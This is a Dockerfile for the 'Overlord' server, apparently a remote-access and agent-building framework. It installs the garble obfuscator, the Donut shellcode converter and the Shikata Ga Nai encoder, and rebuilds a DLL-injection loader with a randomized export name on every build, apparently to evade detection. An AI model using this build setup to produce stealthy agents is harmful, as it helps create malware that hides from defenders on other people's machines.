# syntax=docker/dockerfile:1.7
# Overlord Server Dockerfile (multi-stage)
#
# Stage 1 (builder): full apt toolchain to compile assets + Backstage DLLs.
# Stage 2 (runtime, slim): only what the server needs at startup. Cross-compile
# toolchains (mingw, aarch64/armv7/musl, Android NDK, ldid, UPX) are downloaded
# on first agent build by Overlord-Server/src/server/toolchain-manager.ts and
# cached in the persistent /app/data volume.

# ============================================================
# Stage 1: builder
# ============================================================
FROM oven/bun:1 AS builder
WORKDIR /app

RUN --mount=type=cache,target=/var/cache/apt,sharing=locked \
    --mount=type=cache,target=/var/lib/apt,sharing=locked \
    apt-get update && apt-get install -y --no-install-recommends \
        build-essential \
        gcc-mingw-w64-x86-64 \
        g++-mingw-w64-x86-64 \
        gcc-mingw-w64-i686 \
        ca-certificates \
        wget \
        curl \
        git \
        unzip \
        zip

ENV GO_VERSION=1.26.2
ARG TARGETARCH
RUN case "${TARGETARCH:-amd64}" in \
        amd64) GO_ARCH=amd64 ;; \
        arm64) GO_ARCH=arm64 ;; \
        *) echo "Unsupported architecture: ${TARGETARCH}" >&2; exit 1 ;; \
    esac \
    && wget -q "https://go.dev/dl/go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" \
    && tar -C /usr/local -xzf "go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" \
    && rm "go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" \
    && rm -rf /usr/local/go/test /usr/local/go/api /usr/local/go/doc /usr/local/go/misc

ENV PATH="/usr/local/go/bin:/go/bin:${PATH}"
ENV GOPATH="/go"
ENV GOCACHE=/root/.cache/go-build
ENV GOMODCACHE=/go/pkg/mod

RUN --mount=type=cache,target=/root/.cache/go-build \
    --mount=type=cache,target=/go/pkg/mod \
    go install mvdan.cc/garble@latest

# Rust toolchain for the BackstageInjection DLL cross-build (windows-gnu target).
# `--target x86_64-pc-windows-gnu` also installs that target's rust-std.
ENV RUSTUP_HOME=/usr/local/rustup \
    CARGO_HOME=/usr/local/cargo \
    RUST_VERSION=1.85.0
RUN wget -q "https://sh.rustup.rs" -O rustup-init.sh \
    && sh rustup-init.sh -y --default-toolchain "$RUST_VERSION" \
       --profile minimal --target x86_64-pc-windows-gnu \
    && rm -f rustup-init.sh
ENV PATH="/usr/local/cargo/bin:${PATH}"

# Pre-fetch the latest Donut shellcode converter binary.
# The runtime donut-manager will re-check GitHub and update automatically;
# this step just ensures a working binary is available offline / on first use.
RUN DONUT_TAG=$(curl -sSf "https://api.github.com/repos/TheWover/donut/releases/latest" \
        | grep '"tag_name"' | head -1 | cut -d'"' -f4) \
    && ARCHIVE_URL="https://github.com/TheWover/donut/releases/download/${DONUT_TAG}/donut_${DONUT_TAG}.tar.gz" \
    && if curl -sSfL "${ARCHIVE_URL}" | tar xzf - --strip-components=0 -C /usr/local/bin ./donut 2>/dev/null; then \
        chmod +x /usr/local/bin/donut; \
        echo "Donut ${DONUT_TAG} pre-installed from archive"; \
    else \
        echo "WARNING: Donut pre-fetch failed — will fall back to system PATH or download on first use"; \
    fi

# Pre-fetch the latest Rust SGN (Shikata Ga Nai) binary. The Rust releases use
# target-triple tarballs instead of the legacy sgn_linux_amd64_*.zip naming.
# The runtime sgn-manager re-checks GitHub daily; this provides an offline
# binary for supported Docker architectures on first start.
RUN SGN_ASSET=$(curl -sSf "https://api.github.com/repos/EgeBalci/sgn/releases/latest" \
        | grep -oE '"browser_download_url":[[:space:]]*"[^"]*sgn-x86_64-unknown-linux-musl\.tar\.gz"' \
        | head -1 | cut -d'"' -f4) \
    && if [ "${TARGETARCH:-amd64}" = "amd64" ] \
       && [ -n "${SGN_ASSET}" ] \
       && curl -sSfL "${SGN_ASSET}" \
          | tar -xzf - -C /usr/local/bin sgn \
       && [ -f /usr/local/bin/sgn ]; then \
        chmod +x /usr/local/bin/sgn; \
        echo "SGN pre-installed from ${SGN_ASSET}"; \
    else \
        echo "WARNING: SGN Rust binary is unavailable for ${TARGETARCH:-unknown} — will fall back to system PATH or runtime download"; \
    fi

# Full bun install (includes devDeps needed for tailwind / vendor / minify steps)
COPY Overlord-Server/package.json Overlord-Server/bun.lock* ./
RUN --mount=type=cache,target=/root/.bun/install/cache \
    bun install --frozen-lockfile

# Server source (Overlord-Server/dist-clients may carry a pre-built DLL from a dev build)
COPY Overlord-Server/ ./

# BackstageInjection-Rust source is copied into the runtime stage too so the
# server can recompile + re-randomize the loader export name on demand
# (Settings -> Backstage DLL).
COPY BackstageInjection-Rust/ ./BackstageInjection-Rust/
COPY scripts/build-backstage-dll.sh ./scripts/

# Always compile the Backstage DLL from source so every image embeds a freshly
# randomized loader export name (build.rs picks a new `x<hex>` per build).
# Pass `--build-arg BACKSTAGE_FRESH=$(date +%s)` to defeat BuildKit layer
# caching and force a new random name even with unchanged source.
ARG BACKSTAGE_FRESH=
RUN mkdir -p dist-clients && \
    chmod +x scripts/build-backstage-dll.sh && \
    echo "Building BackstageInjection DLL (fresh=${BACKSTAGE_FRESH:-default})" && \
    BACKSTAGE_CRATE_DIR=BackstageInjection-Rust BACKSTAGE_OUT_DIR=dist-clients bash scripts/build-backstage-dll.sh || \
    echo "WARNING: BackstageInjection DLL build failed; runtime can rebuild on demand (Settings -> Backstage DLL)"

# Keep production build phases separate so BuildKit reports the exact slow or
# failing phase and can cache each completed phase independently.
RUN bun run build:css
RUN bun run build:web:prod
RUN bun run vendor
RUN MINIFY_CONCURRENCY=4 bun run minify
RUN bun run build:bundle

RUN test "$(wc -l < ./public/index.html)" -lt 20 \
    && test "$(wc -l < ./public/assets/main.js)" -lt 50 \
    && test -s ./public/assets/generated/shared-ui-settings.js \
    && test ! -e ./public/assets/generated/shared-ui-settings.js.map \
    && test -s ./public/assets/tailwind.css \
    && test -d ./public/vendor/fontawesome \
    && test -s ./dist/index.js \
    && test -s ./dist/server/plugin-runtime/worker-host.js


# ============================================================
# Stage 2: runtime (slim)
# ============================================================
FROM oven/bun:1-slim AS runtime
LABEL org.opencontainers.image.source="https://gitlab.com/vxaboveground/overlord"
WORKDIR /app

# openssl/ca-certificates: TLS cert generation + HTTPS validation.
# wget/tar/unzip/xz-utils: required by toolchain-manager for on-demand downloads.
# ffmpeg: server-side remote desktop recording encoder.
# clang/lld: Darwin CGO cross-compiler/linker used with a user-uploaded macOS SDK.
RUN --mount=type=cache,target=/var/cache/apt,sharing=locked \
    --mount=type=cache,target=/var/lib/apt,sharing=locked \
    apt-get update && apt-get install -y --no-install-recommends \
        openssl \
        ca-certificates \
        wget \
        tar \
        unzip \
        xz-utils \
        git \
        ffmpeg \
        clang \
        lld \
    && rm -rf /var/lib/apt/lists/*

# Reuse Go + garble from the builder so we don't re-download.
COPY --from=builder /usr/local/go /usr/local/go
COPY --from=builder /go/bin/garble /go/bin/garble

ENV PATH="/usr/local/go/bin:/go/bin:${PATH}"
ENV GOPATH="/go"
ENV GOCACHE=/root/.cache/go-build
ENV GOMODCACHE=/go/pkg/mod

# Production-only node_modules (drops tailwind, terser, postcss, typescript, ...).
COPY Overlord-Server/package.json Overlord-Server/bun.lock* ./
RUN --mount=type=cache,target=/root/.bun/install/cache \
    bun install --production --frozen-lockfile

# Built runtime artifacts from the builder stage.
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/public ./public
COPY --from=builder /app/dist-clients ./dist-clients

# Go agent source needed at every agent build.
COPY Overlord-Client/ ./Overlord-Client/
RUN test -s ./Overlord-Client/third_party/nvcodec/nvEncodeAPI.h

# Rust crate + build script needed for on-demand Backstage DLL recompilation
# (re-randomized loader export) at runtime.
COPY BackstageInjection-Rust/ ./BackstageInjection-Rust/
COPY scripts/build-backstage-dll.sh ./scripts/

RUN mkdir -p certs data

# Pre-seed Go module cache so first agent builds work offline.
RUN --mount=type=cache,target=/root/.cache/go-build \
    --mount=type=cache,target=/go/pkg/mod \
    cd /app/Overlord-Client && \
    GOWORK=off \
    GOMODCACHE=/go/pkg/mod \
    go mod download

EXPOSE 5173/tcp
EXPOSE 5173/udp

ENV PORT=5173
ENV HOST=0.0.0.0
ENV DATA_DIR=/app/data
ENV NODE_ENV=production
ENV OVERLORD_ROOT=/app
ENV NODE_PATH=/app/node_modules

CMD ["bun", "dist/index.js"]
